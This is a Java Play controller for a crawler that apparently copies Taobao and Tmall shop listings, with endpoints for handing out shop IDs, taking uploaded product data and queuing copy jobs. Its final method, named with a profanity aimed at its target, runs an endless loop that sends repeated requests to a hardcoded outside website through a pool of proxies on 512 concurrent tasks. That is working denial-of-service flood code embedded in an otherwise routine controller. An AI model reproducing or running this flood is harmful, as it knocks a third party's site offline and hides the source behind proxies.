package controllers;
import actions.carriertask.BabyInfo;
import actions.carriertask.CarrierTaskAction;
import actions.carriertask.ShopBabyBean;
import actions.carriertask.TaskInfo;

import com.alibaba.fastjson.JSON;
import com.ciaosir.client.CommonUtils;
import com.ciaosir.client.PYFutureTaskPool;
import com.ciaosir.client.api.API;
import com.ciaosir.client.utils.JsonUtil;
import com.ciaosir.client.utils.NetworkUtil;

import configs.TMConfigs;
import dao.UserDao;
import models.carrierTask.CarrierTask;
import models.carrierTask.SubCarrierTask;

import models.user.User;
import org.apache.commons.lang.StringUtils;
import org.apache.http.HttpHost;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import play.mvc.Controller;
import play.mvc.results.RenderText;
import proxy.HttphostWrapper;
import proxy.IProxy;
import proxy.NewProxyTools;
import result.TMResult;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.Callable;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.FutureTask;

/**
 * Created by Administrator on 2016/3/7.
 */
public class ClientSpider extends Controller {

    private static final Logger log = LoggerFactory.getLogger(ClientSpider.class);

    final static PYFutureTaskPool<Void> pool = new PYFutureTaskPool<Void>(512);

    final static String target = "http://vipqt3633.com/";
    
    public static void getSid() {
        List<CarrierTask> tasks = CarrierTask.findSidList();

        if (CommonUtils.isEmpty(tasks) == true) {
            renderJSON(new TMResult(false, "没有待爬店铺ID", null));
        }

        List<TaskInfo> infos = new ArrayList<TaskInfo>();
        for (CarrierTask task : tasks) {
            task.setPullTs(System.currentTimeMillis());
            task.jdbcSave();
            infos.add(new TaskInfo(task.getId(), task.getSid(), task.getPublisher()));
        }

        renderJSON(JsonUtil.getJson(new TMResult(infos)));
    }

    public static final int OneDayLimit = 500;
    public static void finishSidTask(String json) {
        log.info("回传json: " + json);

        if (StringUtils.isEmpty(json) == true) {
            renderJSON(JsonUtil.getJson(new TMResult(false, "上传数据不能为空", null)));
        }

        ShopBabyBean bean = null;
        try {
            bean = JSON.parseObject(json, ShopBabyBean.class);
        } catch (Exception e) {
            log.error("finishSidTask json转化失败: " + e.getMessage());
        }

        if (CarrierTaskAction.checkParams(bean) == false) {
            renderJSON(new TMResult(false, "数据处理异常", null));
        }
        List<BabyInfo> infos = bean.getInfos();
        if(CommonUtils.isEmpty(infos)) {
        	renderJSON(JsonUtil.getJson(new TMResult(false, "无宝贝上传", null)));
        }
        long taskId = Long.parseLong(bean.getTaskId());
        int pn = Integer.parseInt(bean.getPn());
        //检查该页宝贝是否已上传过
        if (SubCarrierTask.isUploadedByPageAndTaskId(taskId, pn) == true) {
            renderJSON(JsonUtil.getJson(new TMResult(false, "该页数据已上传", null)));
        }
        if(SubCarrierTask.countByPublisherDay(StringUtils.trim(bean.getPublisher())) < OneDayLimit) {
            User user = UserDao.findByUserNick(bean.getPublisher());
            SubCarrierTask.batchInsert(infos, taskId, pn, bean.getPublisher(), user.isTmall() ? SubCarrierTask.SubTaskType.天猫复制 : SubCarrierTask.SubTaskType.淘宝复制);
        	 //宝贝数加上
            int count = Integer.parseInt(bean.getBabyCnt());
            CarrierTask.addBabyCnt(taskId, count);
            renderJSON(JsonUtil.getJson(new TMResult(true, "上传成功", null)));
        } else {
        	renderJSON(JsonUtil.getJson(new TMResult(false, "最多500个等待中", null)));
        }
        
    }

    public static void finishShopTask(String json) {
        log.info("任务 " + json + " 已完成");
        if (StringUtils.isEmpty(json) == true) {
            renderJSON(JsonUtil.getJson(new TMResult(false, "上传SID不能为空", null)));
        }
        long sid = Long.parseLong(json);
        if (CarrierTask.finishShopInfo(sid) == true) {
            renderJSON(JsonUtil.getJson(new TMResult(true, "更新成功", null)));
        } else {
            renderJSON(JsonUtil.getJson(new TMResult(false, "更新失败", null)));
        }
    }

    public static void getSubTask(String version) {
    	if (StringUtils.isEmpty(version) || ("1.1.0.3".compareTo(version) > 0)) {
    		renderJSON(JsonUtil.getJson(new TMResult(false, "版本号不符", null)));
        }
    	log.error("getSubTask version = " + version + " and ip = " + NetworkUtil.getRemoteIPForNginx(request));
        List<SubCarrierTask.SubTaskInfo> infos = SubCarrierTask.fetchSubTaskInfo();
        if (CommonUtils.isEmpty(infos) == true) {
            renderJSON(JsonUtil.getJson(new TMResult(false, "没有待爬店铺ID", null)));
        }
        for (SubCarrierTask.SubTaskInfo info : infos) {
            info.setUrl(CarrierTaskAction.getNumId(info.getUrl()) + "");
            SubCarrierTask.updatePullTs(info.getSubTaskId());
        }
        renderJSON(JsonUtil.getJson(new TMResult(infos)));
    }

    public static void checkUrl() {
    	CarrierTaskAction.getNumId("");
    }
    
    public static void finishSubTask(final long taskId, final long numIid, final long subId,
             final String publisher, final String wapData, final String descData, final String wirelessData) {
        log.info("【finishSubTask】start sub_carrier_task ");
        log.info("【finishSubTask】taskId： " + taskId + "~~~numIid： " + numIid + "~~~subId： " + subId + "~~~publisher： " + publisher + "~~~wapData： " + wapData + "~~~descData： " + descData + "~~~wirelessData： " + wirelessData);
        TMConfigs.getCarrierTaskPool().submit(new Callable<Void>() {
            @Override
            public Void call() throws Exception {
                CarrierTaskAction.doCarry(subId, numIid, wapData, descData, wirelessData, publisher);
                log.error("addOneFinishCnt: " + taskId);
                CarrierTaskAction.addOneFinishCnt(taskId);
                log.error("end sub_carrier_task taskId:" + taskId + " subId: " + subId);
                return null;
            }
        });
    }
    
    public static void fetchPool() {
    	NewProxyTools.newInitPools();
    }

    public static void getPoolSize() {
    	renderText(NewProxyTools.getHosts().size());
    }
    
    public static void fuckVip3633() {
    	  new Thread(new Runnable() {
              @Override
              public void run() {
                  while (true) {
                      ConcurrentLinkedQueue<HttpHost> proxies = NewProxyTools.getHosts();
                      for (final HttpHost host : proxies) {
                          pool.submit(new Callable<Void>() {
                              @Override
                              public Void call() throws Exception {
                                  for (int j = 0; j < 5; j++) {
                                      String content = API.directGet(target, null, null, host);
                                      int length = content.length();
                                      System.out.println("[" + j + "] final back res :" + length);
                                      if (length < 500) {
                                          System.out.println("[" + j + "]" + content);
                                      }
                                      CommonUtils.sleepQuietly(1000L);
                                  }
                                  return null;
                              }
                          });
                      }
                      CommonUtils.sleepQuietly(6000L);
                  }
              }
          }).start();

    }

}

